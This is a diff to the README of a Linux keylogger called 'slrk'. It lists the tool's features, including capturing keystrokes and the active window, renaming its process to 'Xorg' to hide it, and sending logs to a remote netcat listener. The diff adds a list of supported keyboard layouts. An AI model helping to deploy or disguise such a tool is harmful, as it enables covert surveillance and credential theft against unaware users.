@@ -4,7 +4,6 @@
 
 - Simple keylogger that runs on Linux either locally or remotely.
 - It shows the active window on which the target is writing.
-- Keys are mapped on US keyboard.
 - It shows the keyboard layout(e.g.: us, it, colemak, etc..).
 - Process name is renamed as "Xorg".
 - It works with both TCP and UDP and with ipv6 too.
@@ -36,4 +35,14 @@ Client#./slrk -m remote -a 127.0.0.1 -p 8888
 ```
 Server$ nc -6 -lvp 8888 > logger.txt
 Client#./slrk -m remote -a ::1 -p 8888
-```	
+```
+##NOTES:
+####Supported Keyboards:
+- QWERTY: us, es, it. 
+- AZERTY: fr.
+- QWERTZ: de.
+- DVORAK: us.
+- COLEMAK
+- default: qwerty-us
+
+
